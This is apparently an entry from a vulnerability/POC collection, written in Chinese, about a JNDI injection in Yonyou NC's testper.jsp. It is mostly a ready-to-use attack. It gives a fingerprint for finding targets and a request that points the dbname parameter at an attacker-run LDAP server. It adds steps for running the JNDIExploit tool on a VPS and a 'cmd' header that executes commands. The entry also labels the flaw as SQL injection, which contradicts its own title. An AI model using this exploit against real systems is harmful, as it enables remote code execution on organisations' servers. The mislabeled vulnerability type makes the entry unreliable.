# 用友NCtestper存在JNDI注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name=="用友 UAP"`
- **请求**：`GET /testper.jsp?dbname=ldap://VPSIP:1389/Basic/TomcatEcho HTTP/1.1`

**请求体 / payload**
```
将`JNDIExploit-1.4-SNAPSHOT.jar`上传到VPS
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i VPSIP
\[JNDIExploit-1.4-SNAPSHOT.jar]\(公众号：渗透安全HackTwo\

Host: {hostname}
cmd: whoami
Cookie: JSESSIONID=082B9F88F7A95DE5AA00852B3A5232E4.server
```

**其他**
- 用友NC testper存在JNDI注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友NC